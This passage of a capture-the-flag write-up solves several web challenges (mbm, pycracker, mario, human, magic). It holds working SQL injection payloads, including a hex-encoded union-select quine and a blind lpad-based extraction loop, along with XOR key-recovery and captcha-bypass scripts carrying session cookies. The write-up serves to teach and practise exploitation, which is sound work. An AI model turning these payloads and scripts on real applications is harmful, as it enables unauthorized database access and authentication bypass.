39366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c414345282224222c43484152283334292c4348415228333929292c43484152283336292c222422292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e6523272c43484152283334292c4348415228333929292c43484152283336292c275c2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c414345282224222c43484152283334292c4348415228333929292c43484152283336292c222422292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e652327292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e6523 from information_schema.processlist where db=database() and id=connection_id() limit 1 union select 1,2,sleep(1)#
)
hooray!!! Flag is stypr_is_The_only_master_LOL_LOL_LOOL
```

## mbm:

```
if(preg_match('/admin|and|or|if|coalesce|case|_|\./i', $_POST['uid'])) exit("No Hack ~_~");

$r = mysql_fetch_array(mysql_query("select id from member where no={$_POST[uid]}"));
if($r['id'] !== "admin") exit("1st sandbox");

$r = mysql_fetch_array(mysql_query("select id from member where no={$_POST[uid]}"));
if($r['id'] === "admin") exit("2nd sandbox");

$r = mysql_fetch_array(mysql_query("select id from member where id='{$_POST[uid]}'"));
if($r['id'] !== "admin") exit("3rd sandbox");

$r = mysql_fetch_array(mysql_query("select id from member where id='{$_POST[uid]}'"));
if($r['id'] === "admin") exit("4th sandbox");

$r = mysql_fetch_array(mysql_query("select id from member where id='{$_POST[uid]}'"));
if($r['id'] === "admin") echo "hooray!!! Flag is {$flag}";
```

Since the authentication goes like loops of ```if admin``` and ```if not admin``` checks, the only way you can solve is to substr ```admin``` and randomize the length of its data. 

Since the ```rand()``` function is blocked from the filteration (```and```), the only possible way of walkthrough will be to use ```curtime() mod 2``` to randomize the time. In order to make sure that the loop of ```if admin``` and ```if not admin``` authentication work, you use the ```sleep()``` function with ```left()``` function and ```curtime()``` function to solve this challenge.

If you're stuck in the third sandbox, it's probably because you did not assign the quotes on your payload. Now you need to hash the query and put quotes, and replicate your query to solve this challenge. The final exploit is as follows:

```
id: 1 union select left(0x61646d696e,4^(curtime()%2)^sleep(1))#' union select left(0x61646d696e,4^(curtime()%2)^sleep(1))#;
pw: 123123

...

hooray!!! Flag is thfwlrgldywmadmsfpemqpfqptdlejwhgdma
```


## pycracker:

This challenge is run by python ```flask``` module and the sourcecode was given.

```
def maze_home():
    ...
    print(raaaaa)
    for i in range(0, 24):
        tmp2[i] = chr(ord(session['demo_key'][i]) ^ raaaaa)
        tmp[i] = tmp2[i].encode('hex')

    #session['demo_key'] = "".join(tmp2)
    Ill = "".join(tmp)
    print("".join(tmp2))
    resp.set_cookie('leaveret', Ill)
    ...
```
The first step is to get the demo key which is randomize in the beginning. However, this demo key can easily be identified because the encryption is randomly done with ```xor``` operator ad hence the key is easy to be recovered. Decoding the demo key from the ```cookie[leaveret]``` is as follows:

```
"""
[*] tmp2: 3>Fuet`9\tMehvqS]\3?Zm2F
[*] tmp:333e4675657460395c744d65687671535d5c333f5a6d3246
"""

demo_key = "1b166e5d4d5c4811745c654d405e597b75741b1772451a6e".decode("hex")

for j in range(0,50):
    tmp2 = [None] * 24
    tmp = [None] * 24
    for i in range(0, 24):
        tmp2[i] = chr(ord(demo_key[i]) ^ j)
        tmp[i] = tmp2[i].encode('hex')
    fail = 0
    for i in range(0, 24):
        if ord(tmp2[i]) not in range(48, 123):
            fail = 1
    if not fail:
        print("[*] tmp2: " + ("".join(tmp2)))
        print("[*] tmp:"  + ("".join(tmp)))
```

After we bypass the demo_key, it's the time to trigger the ```is_admin()``` function. Let's see the source of this function.

```
def is_admin(x):
    if session['id'] == adminid:
            x = "ee05d0d5e22413061acc8872d5f36a92"
    else:
        x=x
    if(len(x) == 32):
        return "You are admin, admin can't solve the maze!!<br>go to the admin page!!<br>"\
                +"And... here is the flag ==> "+flag
    return False
```

Since adminid is md5'd with the unknown value, the only way is to make sure that the ```len(x) == 32``` is triggered from ```x=x```. 

As we look further we see that the ```eval()``` function is triggered in the ```stage_1()``` function. however this eval function is filtered such in a way that none of us can bypass the data. As we scroll down a bit we see the code as follows:
```
    if type(s) == int:
        s = "%20d" % s
    elif type(s) == float:
        s = "%20.20f" % s
    elif type(s) == long:
        s = "%20d" % s
    else:
```

This code above eventually tells us that we can bypass the length and make ```len(x) == 32``` iff we make a float equation. Therefore inserting  ```1.0+9999999999.0=10000000000.00000000000000000000``` as a solution on the ```stage_1()``` will let you retrieve the flag.

![solved](https://p.stypr.com/086abb.png)

## mario:

There's no index.php backup, therefore the emotion has to be retrieved by hand. (coding an automation would take a bit longer time I guess.)

The automated solution is as follows:
```
import sys
import urllib
import urllib2

def get_emoticon(number):
	temp = open("emoticon_list.txt", "r")
	temp = temp.readlines()
	temp_dict = {}
	for temp_val in temp:
		temp_real_val = temp_val.strip().split("||")
		temp_dict[temp_real_val[0]] = temp_real_val[1]
	return temp_dict[str(number)]

def get_monster_id(number):
        temp = open("monster_list.txt", "r")
        temp = temp.readlines()
        temp_dict = {}
        for temp_val in temp:
                temp_real_val = temp_val.strip().split("||")
                temp_dict[temp_real_val[0]] = temp_real_val[1]
        return temp_dict[str(number)]

face_final = str()
monster_final = str()
while True:
	print(face_final)
	print(monster_final)
	payload = str()
	if face_final and monster_final:
		payload = urllib.urlencode({'cap': face_final, 'choice': monster_final})

	if len(payload) < 12:
		data_request = urllib2.Request("http://ctf.leaveret.kr/go/f9c161aa913e7a8090a6989a4f1afe50/")
	else:
		print("[*] Sending payload .... " + payload)
		data_request = urllib2.Request("http://ctf.leaveret.kr/go/f9c161aa913e7a8090a6989a4f1afe50/", payload)
	data_request.add_header('Cookie', 'PHPSESSID=boa65u1m96ton8ri9ros5qhjl2; switch=on')
	data_response = urllib2.urlopen(data_request)
	data_response = data_response.read()
	print("---------------------------------------")
	try:
		print("[*] System Message: " + (data_response.split("system message = <br />")[1].split("<br /")[0].strip()))
	except:
		print("[*] System Message: " + (data_response.split("system message =")[1].split("<br /")[0].strip()))
		#sys.exit(0)
	print("[*] My life: " +	(data_response.split("your life = <b>")[1].split("</b><br />")[0].strip()))
	print("[*] Money: " + (data_response.split("your points = <b>")[1].split("</b><br />")[0].strip()))
	monster = str(data_response.split("<img src=\"image/")[1].split(".png\">")[0])
	print("[+] Monster: " + monster)
	face = str(data_response.split("<img src=\"face/")[1].split(".png\">")[0])
	print("[+] Face: " + face)
	print("[+] Face(): " + str(get_emoticon(face)))
	print("[+] Monster(): " + str(get_monster_id(monster)))

	face_final = str(get_emoticon(face))
	monster_final = str(get_monster_id(monster))

	#__import__("time").sleep()
```

Emoticon was hard to identify the image, but then the monster was kinda easy to be listed since the choice of the user is very limited. Because of that I've made a code to get a monster_list containing appropraite options. 
```
import os

monster_list = open("moster_list.txt", "w")

for i in range(0, 360):
	hash_value = (os.popen("curl -s  'http://ctf.leaveret.kr/go/f9c161aa913e7a8090a6989a4f1afe50/image/" + str(i) + ".png' | md5").read().strip())
	if hash_value == "86abe3dc5bb6014634a2c785792db15b":
		monster_list.write(str(i)+"||"+str(2) + "\n")
		print("turtle")
	elif hash_value == "cff380cb072394330ec980dea32830e1":
                monster_list.write(str(i)+"||"+str(3) + "\n")
		print("question_box")
	elif hash_value == "ea78b7b14d4b009c9adecbb23b22d26d":
                monster_list.write(str(i)+"||"+str(1) + "\n")
		# 1
		print("spark_shell")
	elif hash_value == "210e4462b47bbb6813e77f976beee395":
                monster_list.write(str(i)+"||"+str(2) + "\n")
		# 2
		print("mushroom")
	elif hash_value == "626d78a864c40d2379fada743817d86b":
                monster_list.write(str(i)+"||"+str(1) + "\n")
		# 1
		print("box_monster")
	elif hash_value == "65317a96b098f94fc51daf2c89d03d48":
		# 2
                monster_list.write(str(i)+"||"+str(2) + "\n")
		print("boss_mobb")
	# good items
	elif hash_value == "7f16dc27bb0f2a0a3487ecc41ac3169d":
                monster_list.write(str(i)+"||"+str(4) + "\n")
		# 4
		print("red_mushroom")
	elif hash_value == "d6a028f5e86dce1455031459ea4a7e4e":
		# 4
                monster_list.write(str(i)+"||"+str(4) + "\n")
		print("green_mushroom")
	elif hash_value == "a9939f757c1aacc98c2f235a48b7281e":
		# 4
		print("gold")
                monster_list.write(str(i)+"||"+str(4) + "\n")
	elif hash_value == "":
		print("Wtf")
	else:
		mosnter_list.write(str((hash_value, i)))
	print(i)

monster_list.close()
```


## human

This question has a hidden backup file (namely ```index.php.bak```) on the server. 

Nothing to explain new about this solution, it's just ordinary captcha bypass solution. The automated solution is as follows:

```
import urllib2
import urllib
import sys
import random
import time

# 0x42443243384544464339334142303730313738443646423335343531413035343141324639413135 is the flag
flag_real = ""

def get_captcha(no):
    flag_list = open("captcha_list.py", "r")
    flag_list = flag_list.read()
    flag_list = flag_list.split("\\n")
    flag_dict = {}
    for flag in flag_list:
        temp = flag.split(":")
        flag_dict[temp[0]] = temp[1]
    return flag_dict[no]

def get_truefalse(no):
    tf_list = open("truefalse_list.py", "r")
    tf_list = tf_list.read()
    tf_list = tf_list.split("\\n")
    tf_dict = {}
    for tf in tf_list:
        temp = tf.split(":")
        tf_dict[temp[0]] = temp[1]
    return tf_dict[no]

for i in range(0,41):
    for j in range(48,122):
        k = urllib2.Request("http://ctf.leaveret.kr/go/b53da31f9e7612c0ee6afd724b007072/")
        k.add_header('Cookie', 'PHPSESSID=boa65u1m96ton8ri9ros5qhjl2; switch=on')
        r = urllib2.urlopen(k)
        captcha_id = r.read()
        captcha_id = captcha_id.split("<img src=\"captcha/")[1].split(".png\">")[0]

        # print(get_captcha(captcha_id))

        payload = "((lpad(pw," + str(i) + ",space(0)))in(0x" + flag_real + chr(j).encode("hex") + "))%2b1"
        print(payload)
        k = urllib2.Request("http://ctf.leaveret.kr/go/b53da31f9e7612c0ee6afd724b007072/?cap=" + get_captcha(captcha_id) + "&no=" + payload)
        k.add_header('Cookie', 'PHPSESSID=boa65u1m96ton8ri9ros5qhjl2; switch=on')
        r = urllib2.urlopen(k)
        q = r.read()
        try:
            q = q.split("<img src=\"captcha/")[2].split(".png\">")[0]
            print(q)
            #  print(get_truefalse(q))
            if("true" in get_truefalse(q)):
                flag_real += chr(j).encode("hex")
                print(j.encode("hex"))
                print(flag_real)
                break
            else:
                continue
        except:
            print(q)
```

## magic

This question has a hidden backup file (namely ```index.php.bak```) on the server. 

Nothing to explain new about this solution, it's just magic hash solution. I was the first blood of this challenge lol.

```
id/pw: admin/315655854

Success! Hello Admin
Key : Sti11!be1i3v3@in#mag1c
```

